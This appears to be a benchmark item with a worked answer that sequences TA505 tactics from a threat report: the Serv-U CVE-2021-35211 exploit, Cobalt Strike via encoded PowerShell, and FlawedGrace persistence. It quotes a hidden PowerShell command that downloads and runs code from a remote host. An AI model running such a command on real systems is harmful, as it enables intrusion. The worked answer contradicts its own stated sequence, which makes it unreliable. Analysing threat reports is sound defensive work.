### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- TA505 exploited a vulnerability in SolarWinds Serv-U software (CVE-2021-35211) to gain initial access.
- This method is a shift from their typical phishing-based methods.

**Execution:**
- TA505 used Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon.
- The PowerShell command was: `powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://IP:PORT/a'))`.

**Persistence:**
- TA505 maintained access by hijacking a scheduled task named RegIdleBackup.
- They altered the COM handler to execute the FlawedGrace RAT.
- The FlawedGrace RAT loader was stored as Base64 encoded strings.

**Others:**
- NCC Group noted an increase in Clop ransomware victims linked to this vulnerability.
- Recommendations for updating to the latest version and checking for signs of exploitation were provided.

#### 2. Analyze the Question

**Question:**
- After storing the FlawedGrace RAT loader as Base64 encoded strings for defense evasion, is it likely that TA505 will execute Cobalt Strike Beacon on the compromised systems using Base64 encoded PowerShell commands only after gaining initial access by exploiting the SolarWinds Serv-U vulnerability (CVE-2021-35211)?

**Answer Choices:**
- A: Yes
- B: No

#### 3. Compare and Evaluate

**Attack Sequence from the CTI Report:**
1. **Initial Access:** Exploit the SolarWinds Serv-U vulnerability (CVE-2021-35211).
2. **Execution:** Use Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon.
3. **Persistence:** Hijack a scheduled task and alter the COM handler to execute the FlawedGrace RAT.
4. **Defense Evasion:** Store the FlawedGrace RAT loader as Base64 encoded strings.

**Question Analysis:**
- The question asks if it is likely that TA505 will execute Cobalt Strike Beacon using Base64 encoded PowerShell commands only after gaining initial access by exploiting the SolarWinds Serv-U vulnerability.
- From the CTI report, we know that:
  - Initial access is gained by exploiting the SolarWinds Serv-U vulnerability.
  - Cobalt Strike Beacon is deployed using Base64 encoded PowerShell commands.
  - The FlawedGrace RAT loader is stored as Base64 encoded strings for defense evasion.

**Evaluation:**
- The sequence described in the question aligns with the attack sequence in the CTI report.
- The report clearly states that the initial access is gained by exploiting the SolarWinds Serv-U vulnerability, and then Cobalt Strike Beacon is deployed using Base64 encoded PowerShell commands.
- The storage of the FlawedGrace RAT loader as Base64 encoded strings is a separate step for persistence and defense evasion, but it does not affect the sequence of initial access and execution of Cobalt Strike Beacon.

#### 4. Provide a Step-by-Step Reasoning and Final Answer

- The CTI report confirms that TA505 gains initial access by exploiting the SolarWinds Serv-U vulnerability.
- After gaining initial access, they use Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon.
- The storage of the FlawedGrace RAT loader as Base64 encoded strings is a subsequent step for persistence and defense evasion.

**Final Answer: A: Yes**
